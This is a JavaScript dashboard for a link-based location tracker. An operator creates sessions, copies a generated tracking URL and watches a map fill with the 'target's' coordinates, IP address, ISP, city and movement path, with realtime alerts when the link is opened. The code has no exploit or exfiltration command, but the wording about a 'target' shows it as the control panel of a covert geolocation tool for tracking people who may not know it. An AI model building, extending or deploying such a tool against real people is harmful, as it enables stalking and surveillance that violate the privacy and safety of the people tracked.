// ═══════════════════════════════════════════════════════════
// DASHBOARD — Supabase + Leaflet + Realtime
// ═══════════════════════════════════════════════════════════

(() => {
  'use strict';

  const db = getSupabase();
  let map, activeSessionId = null, realtimeChannel = null;
  const markerGroups = new Map();

  // ── Toast ────────────────────────────────────
  function toast(msg, type = 'info') {
    const el = document.createElement('div');
    el.className = `toast ${type}`;
    el.textContent = msg;
    document.getElementById('toastContainer').appendChild(el);
    setTimeout(() => el.remove(), 4000);
  }

  // ── Map Init ─────────────────────────────────
  function initMap() {
    map = L.map('map', { center: [20, 0], zoom: 2, attributionControl: false });
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
      maxZoom: 19,
    }).addTo(map);
  }

  // ── Load All Sessions ───────────────────────
  async function loadSessions() {
    const { data: sessions, error } = await db
      .from('sessions')
      .select('*')
      .order('created_at', { ascending: false });

    if (error) { toast('Failed to load sessions', 'error'); return; }

    // Fetch ping counts and last seen for each session
    const enriched = await Promise.all(
      sessions.map(async (s) => {
        const { count } = await db
          .from('locations')
          .select('*', { count: 'exact', head: true })
          .eq('session_id', s.id);

        const { data: latest } = await db
          .from('locations')
          .select('created_at')
          .eq('session_id', s.id)
          .order('created_at', { ascending: false })
          .limit(1);

        return {
          ...s,
          ping_count: count || 0,
          last_seen: latest?.[0]?.created_at || null,
        };
      })
    );

    renderSessions(enriched);
  }

  // ── Render Sessions ─────────────────────────
  function renderSessions(sessions) {
    const el = document.getElementById('sessionsList');

    if (!sessions.length) {
      el.innerHTML = `
        <div class="empty-state">
          <div class="icon">📭</div>
          <p>No sessions yet.<br>Create one to start tracking.</p>
        </div>`;
      return;
    }

    el.innerHTML = sessions.map(s => `
      <div class="session-card ${s.id === activeSessionId ? 'active' : ''}"
           data-id="${s.id}" onclick="window._select('${s.id}')">
        <div class="name">
          <span class="status-dot ${s.is_active ? 'active' : 'inactive'}"></span>
          ${escHtml(s.name)}
        </div>
        <div class="meta">
          <span>🏓 ${s.ping_count} pings</span>
          <span>👁 ${s.last_seen ? timeAgo(s.last_seen) : 'Never'}</span>
        </div>
      </div>
    `).join('');
  }

  // ── Create Session ──────────────────────────
  async function createSession(name) {
    const id = generateId();
    const { error } = await db.from('sessions').insert({ id, name });
    if (error) { toast('Failed to create session: ' + error.message, 'error'); return; }
    toast(`Session "${name}" created!`, 'success');
    await loadSessions();
    selectSession(id);
  }

  // ── Select Session ─────────────────────────
  async function selectSession(id) {
    activeSessionId = id;

    // Unsubscribe previous realtime
    if (realtimeChannel) {
      db.removeChannel(realtimeChannel);
      realtimeChannel = null;
    }

    // Fetch session
    const { data: session } = await db
      .from('sessions')
      .select('*')
      .eq('id', id)
      .single();

    if (!session) { toast('Session not found', 'error'); return; }

    // Fetch locations
    const { data: locations } = await db
      .from('locations')
      .select('*')
      .eq('session_id', id)
      .order('created_at', { ascending: false })
      .limit(200);

    // Update panel
    const panel = document.getElementById('infoPanel');
    document.getElementById('panelTitle').innerHTML = `
      ${escHtml(session.name)}
      ${session.is_active
        ? '<span class="live-badge"><span class="pulse"></span>LIVE</span>'
        : '<span class="badge" style="background:var(--text-muted);color:#000">PAUSED</span>'}
    `;

    // Build tracking URL
    const base = window.location.href.replace(/\/[^/]*$/, '');
    document.getElementById('trackingUrl').value = `${base}/track.html?s=${id}`;

    // Toggle button text
    document.getElementById('toggleBtn').textContent =
      session.is_active ? '⏸ Pause' : '▶ Resume';

    panel.classList.add('visible');
    renderLocations(locations || []);
    updateMap(id, locations || []);

    // Highlight sidebar
    document.querySelectorAll('.session-card').forEach(c =>
      c.classList.toggle('active', c.dataset.id === id)
    );

    // ── Subscribe to Realtime inserts ─────────
    realtimeChannel = db
      .channel(`locations-${id}`)
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'locations',
          filter: `session_id=eq.${id}`,
        },
        (payload) => {
          toast('📍 New location ping!', 'success');
          selectSession(id); // Refresh
        }
      )
      .subscribe();
  }

  // ── Render Locations ────────────────────────
  function renderLocations(locations) {
    const el = document.getElementById('locationHistory');

    if (!locations.length) {
      el.innerHTML = `
        <h4>📍 Location History</h4>
        <div class="empty-state"><p>Waiting for target to open the tracking link…</p></div>`;
      return;
    }

    el.innerHTML = `
      <h4>📍 Location History (${locations.length})</h4>
      ${locations.map((loc, i) => `
        <div class="location-entry">
          <div class="coords">
            ${loc.latitude?.toFixed(6) ?? '?'}, ${loc.longitude?.toFixed(6) ?? '?'}
            ${i === 0 ? '<span class="live-badge" style="margin-left:8px"><span class="pulse"></span>Latest</span>' : ''}
          </div>
          <div class="details">
            📍 ${escHtml(loc.city)}, ${escHtml(loc.region)}, ${escHtml(loc.country)}<br>
            🌐 IP: <code>${escHtml(loc.ip)}</code><br>
            🏢 ISP: ${escHtml(loc.isp)}<br>
            🎯 Accuracy: ${escHtml(loc.accuracy)}
          </div>
          <div class="time">${new Date(loc.created_at).toLocaleString()}</div>
        </div>
      `).join('')}
    `;
  }

  // ── Update Map ──────────────────────────────
  function updateMap(sessionId, locations) {
    // Clear old
    if (markerGroups.has(sessionId)) {
      map.removeLayer(markerGroups.get(sessionId));
    }

    const valid = locations.filter(l => l.latitude && l.longitude);
    if (!valid.length) return;

    const group = L.layerGroup();

    // Path line
    if (valid.length > 1) {
      L.polyline(
        valid.map(l => [l.latitude, l.longitude]),
        { color: '#00d4ff', weight: 2, opacity: 0.5, dashArray: '5,10' }
      ).addTo(group);
    }

    // Markers
    valid.forEach((loc, i) => {
      const isLatest = i === 0;
      const icon = L.divIcon({
        className: 'custom-marker',
        html: `<div class="marker-ping ${isLatest ? 'latest' : ''}"
                    style="opacity:${isLatest ? 1 : 0.4};
                           width:${isLatest ? 22 : 10}px;
                           height:${isLatest ? 22 : 10}px"></div>`,
        iconSize: [22, 22],
        iconAnchor: [11, 11],
      });

      L.marker([loc.latitude, loc.longitude], { icon })
        .bindPopup(`
          <div style="font-size:13px;line-height:1.6">
            <strong>${escHtml(loc.city)}, ${escHtml(loc.country)}</strong><br>
            IP: <code>${escHtml(loc.ip)}</code><br>
            ISP: ${escHtml(loc.isp)}<br>
            Accuracy: ${escHtml(loc.accuracy)}<br>
            Time: ${new Date(loc.created_at).toLocaleString()}
          </div>`)
        .addTo(group);
    });

    group.addTo(map);
    markerGroups.set(sessionId, group);

    // Fly to latest
    map.flyTo([valid[0].latitude, valid[0].longitude], 13, { duration: 1.5 });
  }

  // ── Toggle Session ──────────────────────────
  async function toggleSession() {
    if (!activeSessionId) return;
    const { data: session } = await db
      .from('sessions')
      .select('is_active')
      .eq('id', activeSessionId)
      .single();

    await db
      .from('sessions')
      .update({ is_active: !session.is_active })
      .eq('id', activeSessionId);

    toast(session.is_active ? 'Session paused' : 'Session resumed', 'info');
    await loadSessions();
    selectSession(activeSessionId);
  }

  // ── Delete Session ──────────────────────────
  async function deleteSession() {
    if (!activeSessionId) return;
    if (!confirm('Delete this session and all location data?')) return;

    const id = activeSessionId;

    // Remove realtime
    if (realtimeChannel) {
      db.removeChannel(realtimeChannel);
      realtimeChannel = null;
    }

    // Clear map markers
    if (markerGroups.has(id)) {
      map.removeLayer(markerGroups.get(id));
      markerGroups.delete(id);
    }

    // Delete from DB (cascade deletes locations)
    await db.from('locations').delete().eq('session_id', id);
    await db.from('sessions').delete().eq('id', id);

    activeSessionId = null;
    document.getElementById('infoPanel').classList.remove('visible');

    toast('Session deleted', 'error');
    await loadSessions();
  }

  // ── Expose Global ──────────────────────────
  window._select = selectSession;

  // ── Init ────────────────────────────────────
  document.addEventListener('DOMContentLoaded', () => {
    initMap();
    loadSessions();

    // Create form
    document.getElementById('createForm').addEventListener('submit', e => {
      e.preventDefault();
      const input = document.getElementById('sessionName');
      if (input.value.trim()) {
        createSession(input.value.trim());
        input.value = '';
      }
    });

    // Close panel
    document.getElementById('closePanel').addEventListener('click', () => {
      document.getElementById('infoPanel').classList.remove('visible');
      activeSessionId = null;
      if (realtimeChannel) { db.removeChannel(realtimeChannel); realtimeChannel = null; }
      document.querySelectorAll('.session-card').forEach(c => c.classList.remove('active'));
    });

    // Copy URL
    document.getElementById('copyUrlBtn').addEventListener('click', () => {
      const input = document.getElementById('trackingUrl');
      navigator.clipboard.writeText(input.value)
        .then(() => toast('URL copied!', 'success'))
        .catch(() => { input.select(); document.execCommand('copy'); toast('URL copied!', 'success'); });
    });

    // Toggle
    document.getElementById('toggleBtn').addEventListener('click', toggleSession);

    // Delete
    document.getElementById('deleteBtn').addEventListener('click', deleteSession);

    // Auto-refresh sessions every 30s
    setInterval(loadSessions, 30000);
  });
})();